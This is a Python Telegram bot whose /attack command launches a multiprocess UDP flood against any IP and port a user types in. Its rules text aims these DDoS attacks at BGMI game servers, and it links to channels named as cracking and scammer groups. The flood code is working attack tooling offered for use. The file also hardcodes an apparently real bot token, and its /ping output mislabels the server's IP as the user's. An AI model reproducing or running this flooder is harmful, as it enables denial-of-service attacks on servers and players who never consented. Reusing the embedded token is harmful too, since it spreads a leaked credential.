import telebot
import socket
import multiprocessing
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import socket
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '7764942096:AAEFuijVb9KwNEXCPzNfPIwbyWj8G3ubiIQ'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [6906270448]

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(20000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

def start_udp_flood(user_id, target_ip, target_port):
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 1000 CPU threads for maximum performance
    for _ in range(min(2000, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)
    
    # Send message with the attack info and inline keyboard
    bot.send_message(user_id, 
                     f"☢️ Launching an attack on {target_ip}:{target_port} 💀", 
                     reply_markup=get_inline_keyboard())


def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_flag = user_attacks[user_id]
        stop_flag.set()  # 🛑 Stop the attack

        # 🕒 Wait for all processes to finish
        for process in processes:
            process.join()

        del user_attacks[user_id]
        
        # Send message that the attack has stopped with inline keyboard
        bot.send_message(user_id, 
                         "🔴 All Attack stopped.", 
                         reply_markup=get_inline_keyboard())
    else:
        bot.send_message(user_id, 
                         "❌ No active attack found >ᴗ<", 
                         reply_markup=get_inline_keyboard())


# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

def get_inline_keyboard():
    keyboard = InlineKeyboardMarkup()
    button1 = InlineKeyboardButton("👤 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 👤", url="https://t.me/RARExxOWNER")
    button2 = InlineKeyboardButton("🔥 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 🔥", url="https://t.me/RARECRACKS")
    button3 = InlineKeyboardButton("🔗 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗚𝗥𝗢𝗨𝗣 🔗", url="https://t.me/freerareddos")
    button4 = InlineKeyboardButton("💀 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗦𝗖𝗔𝗠𝗠𝗘𝗥𝗦 𝗛𝗘𝗟𝗟 💀", url="https://t.me/RARESCAMMERSHELL")
    
    # Add buttons as separate rows
    keyboard.add(button1)
    keyboard.add(button2)
    keyboard.add(button3)
    keyboard.add(button4)
    
    return keyboard

# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')
    
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message.chat.id, "🚫 *Access Denied!* Contact the owner for assistance: @RARExxOWNER")
    else:
        welcome_message = (
            "🎮 *Welcome to the Ultimate Attack Bot!* 🚀\n\n"
            "Get ready to dive into the action! 💥\n\n"
            
            "✨ *How to Get Started:*\n"
            "- Use `/attack <IP>:<port>` to start an attack. 💣\n"
            "- Use `/stop` to halt your attack at any time. 🛑\n"
            "- Use `/start` to fuck off the BGMI server! 🔥\n\n"
            "---\n\n"
            
            "📜 *Bot Rules - Keep It Cool!* 🌟\n\n"
            "1. ⛔ *No Spamming!* \n   Rest for 5-6 matches between DDOS attacks to keep things fair.\n\n"
            "2. 🔫 *Limit Your Kills!* \n   Aim for 30-40 kills max to keep the gameplay fun.\n\n"
            "3. 🎮 *Play Smart!* \n   Stay low-key and avoid being reported. Keep it clean!\n\n"
            "4. 🚫 *No Mods Allowed!* \n   Using hacked files will result in an instant ban.\n\n"
            "5. 🤝 *Be Respectful!* \n   Treat others kindly. Let's keep communication fun and friendly.\n\n"
            "6. 🛡️ *Report Issues!* \n   If you encounter any problems, message the owner for support.\n\n"
            "7. ✅ *Double-Check Your Commands!* \n   Always make sure you're executing the right command before hitting enter.\n\n"
            "8. ❌ *No Unauthorized Attacks!* \n   Always get permission before launching an attack.\n\n"
            "9. ⚖️ *Understand the Consequences!* \n   Be aware of the impact of your actions.\n\n"
            "10. 🤗 *Play Fair and Have Fun!* \n   Stick to the rules, stay within limits, and enjoy the game! 🎉\n\n"
            
            "---\n\n"
            "💡 *Follow the Rules & Let's Game Together!* 🎮\n"
            "Let's create an amazing experience for everyone! 🌟\n\n"
            
            "📞 *Contact the Owner:* \n"
            "Instagram & Telegram: [RARExxOWNER](https://t.me/RARExxOWNER)\n\n"
            
            "---\n\n"
            "⚡ *Bot Commands:* \n"
            "- Type `/help` for a full list of commands. 📋\n"
            "- Type `/id` to find your user ID. 🆔"
        )
        bot.reply_to(message, welcome_message, parse_mode='Markdown', reply_markup=get_inline_keyboard())
        
# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')
    
    if user_id not in AUTHORIZED_USERS:
        # Send access denied message with inline keyboard
        response = "🚫 Access Denied! Contact the owner for assistance: @RARExxOWNER"
        bot.reply_to(message, response, reply_markup=get_inline_keyboard())  # Sends access denied message with inline keyboard
        return

    # Parse target IP and port from the command ︵‿︵‿︵‿︵ ⋆.˚🦋༘⋆
    try:
        command = message.text.split()
        target = command[1].split(':')
        target_ip = target[0]
        target_port = int(target[1])

        # Start the UDP flood attack (you can define start_udp_flood in your code)
        start_udp_flood(user_id, target_ip, target_port)
    except (IndexError, ValueError):
        # If command format is wrong, send error message with inline keyboard
        bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.", 
                         reply_markup=get_inline_keyboard())

        
"""""
    Me             scammer 🏳️‍🌈
 ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
"""""
# 💬 Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')
    
    if user_id not in AUTHORIZED_USERS:
        # If the user is not authorized, send an access denied message with inline keyboard
        response = "🚫 Access Denied! Contact the owner for assistance: @RARExxOWNER"
        bot.reply_to(message, response, reply_markup=get_inline_keyboard())  # Sends the access denied message with inline keyboard
        return

    # Stop the attack for authorized users
    stop_attack(user_id)
    
    # Send the attack stopped message with inline keyboard
    bot.send_message(message.chat.id, "🛑 Attack has been stopped successfully.", reply_markup=get_inline_keyboard())  # Confirmation message and inline keyboard

# 💬 Command handler for /id  
@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
def show_id(message):
    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆

    # 👤 Sending the message with the user ID and username, and adding an inline keyboard
    id_message = f"👤 Your User ID is: `{user_id}`\n" \
                 f"👥 Your Username is: @{username}"

    bot.reply_to(message, id_message, reply_markup=get_inline_keyboard())  # Sending the message with inline keyboard


# 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
@bot.message_handler(commands=['owner'])
def bot_owner_message(message):
    bot_owner = "RARExxOWNER"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    response = f"🤖 This bot is owned by: @{bot_owner}"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    
    rules_message = (
        "🌟 *Bot Rules - Keep It Cool!* 🌟\n\n"
        
        "📝 *1. No Spamming Attacks!* ⛔\n"
        "   - Rest for 5-6 matches between DDOS.\n\n"
        
        "🔫 *2. Limit Your Kills!* 🚫\n"
        "   - Stay under 30-40 kills to keep the game fair.\n\n"
        
        "🎮 *3. Play Smart!* 🧠\n"
        "   - Avoid reports and stay under the radar.\n\n"
        
        "🚫 *4. No Mods Allowed!* ⚠️\n"
        "   - Using hacked files or mods will result in a ban.\n\n"
        
        "🤝 *5. Be Respectful!* 💬\n"
        "   - Keep communication friendly and positive.\n\n"
        
        "🛡️ *6. Report Issues!* 📩\n"
        "   - If you encounter any problems, message the owner.\n\n"
        
        "✅ *7. Check Your Command Before Executing!* 🧐\n"
        "   - Double-check your inputs before pressing send.\n\n"
        
        "⚠️ *8. No Attacks Without Permission!* 🔴\n"
        "   - Always ask before attacking, respect others' gameplay.\n\n"
        
        "⚖️ *9. Be Aware of the Consequences!* 🚨\n"
        "   - Your actions have consequences, think before you act.\n\n"
        
        "🎉 *10. Play Fair and Have Fun!* 😄\n"
        "   - Stay within limits and enjoy the game with others!\n\n"
        
        "⚠️ *Note:* Always follow the rules to ensure a smooth experience for everyone. Let's make it fun! 🎮"
    )
    
    bot.reply_to(message, rules_message, parse_mode='Markdown', reply_markup=get_inline_keyboard())

# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁.
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    response = "📞 Contact the owner: @RARExxOWNER"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁.
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    uptime_message = f"⏱️ Bot Uptime: {get_uptime()}"
    bot.reply_to(message, uptime_message, reply_markup=get_inline_keyboard())

# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['ping'])
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    bot.send_message(message.chat.id, "Checking your connection speed...")

    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.reply_to(message, ping_response, reply_markup=get_inline_keyboard())  # Reply with inline keyboard
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")
        
def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    
    help_message = (
        "🤔 *Need Help?* 🤔\n\n"
        
        "🔹 *`/start`* - Start the bot 🔋\n"
        "   - Initialize the bot and get started.\n\n"
        
        "💣 *`/attack <IP>:<port>`* - Launch a powerful attack 💥\n"
        "   - Use this command to initiate a targeted attack.\n\n"
        
        "🛑 *`/stop`* - Stop the attack 🛑\n"
        "   - Halt any ongoing attacks immediately.\n\n"
        
        "👀 *`/id`* - Show your user ID 👤\n"
        "   - Display your unique user identifier.\n\n"
        
        "📚 *`/rules`* - View the bot rules 📖\n"
        "   - Check the bot's rules to ensure fair play.\n\n"
        
        "👑 *`/owner`* - Contact the owner 👑\n"
        "   - Reach out to the bot's owner for any inquiries.\n\n"
        
        "⏰ *`/uptime`* - Get bot uptime ⏱️\n"
        "   - See how long the bot has been running.\n\n"
        
        "📊 *`/ping`* - Check your connection ping 📈\n"
        "   - Test your connection to the bot server.\n\n"
        
        "🤝 *`/help`* - Show this help message 🤝\n"
        "   - Display the list of available commands.\n\n"
        
        "✨ *Tip:* Use these commands to fully interact with the bot and make the most of your experience! 🎮"
    )
    
    bot.reply_to(message, help_message, parse_mode='Markdown', reply_markup=get_inline_keyboard())

#### DISCLAIMER ####              ✦•┈๑⋅⋯ ⋯⋅๑┈•✦                      ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
"""
**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**

This bot is owned and operated by @RARExxOWNER on Telegram and RARExxOWNER on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:

* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
* **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @RARExxOWNER on Telegram and RARExxOWNER on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws and regulations, including but not limited to laws related to intellectual property, data privacy, and cybersecurity.
* **📊 DATA COLLECTION**: This bot may collect and use data and information about your usage, including but not limited to your IP address, device information, and usage patterns, and you consent to such collection and use.
* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless @RARExxOWNER on Telegram and RARExxOWNER on Instagram, and its affiliates, officers, agents, and employees, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from or related to your use of this bot.
* **🌐 THIRD-PARTY LINKS**: This bot may contain links to third-party websites or services, and you acknowledge that @RARExxOWNER on Telegram and RARExxOWNER on Instagram is not responsible for the content, accuracy, or opinions expressed on such websites or services.
* **🔄 MODIFICATION AND DISCONTINUATION**: You agree that @RARExxOWNER on Telegram and RARExxOWNER on Instagram may modify or discontinue this bot at any time, without notice, and that you will not be entitled to any compensation or reimbursement for any losses or damages arising from such modification or discontinuation.
* **👧 AGE RESTRICTION**: You acknowledge that this bot is not intended for use by minors, and that you are at least 18 years old (or the age of majority in your jurisdiction) to use this bot.
* **🇮🇳 GOVERNING LAW**: You agree that this disclaimer and the terms and conditions of this bot will be governed by and construed in accordance with the laws of India, 🇮🇳, and that any disputes arising from or related to this bot will be resolved through binding arbitration in accordance with the rules of [Arbitration Association].
* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement between you and @RARExxOWNER on Telegram and RARExxOWNER on Instagram regarding your use of this bot, and supersedes all prior or contemporaneous agreements or understandings.
* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. If you do not agree to these terms and conditions, please do not use this bot.

**👋 THANK YOU FOR READING! 👋**
"""
# don't Change the " DISCLAIMER " ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
"""
███████▀▀▀░░░░░░░▀▀▀███████  
████▀░░░░░░░░░░░░░░░░░▀████  
███│░░░░░░░░░░░░░░░░░░░│███  
██▌│░░░░░░░░░░░░░░░░░░░│▐██  
██░└┐░░░░░░░░░░░░░░░░░┌┘░██  
██░░└┐░░░░░░░░░░░░░░░┌┘░░██  
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██  
██▌░│██████▌░░░▐██████│░▐██  
███░│▐███▀▀░░▄░░▀▀███▌│░███  
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██  
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██  
████▄─┘██▌░░░░░░░▐██└─▄████  
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████  
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████  
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  
███████▄░░░░░░░░░░░▄███████  
██████████▄▄▄▄▄▄▄██████████  
███████████████████████████  
"""
# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
    print(" ⏱️ Initializing bot components...")  # Print statement for initialization

    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
    time.sleep(5)

    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        print(" 🔁 Restarting the Telegram bot... 🔄")
        print(" 💻 Bot is now restarting. Please wait... ⏳")
        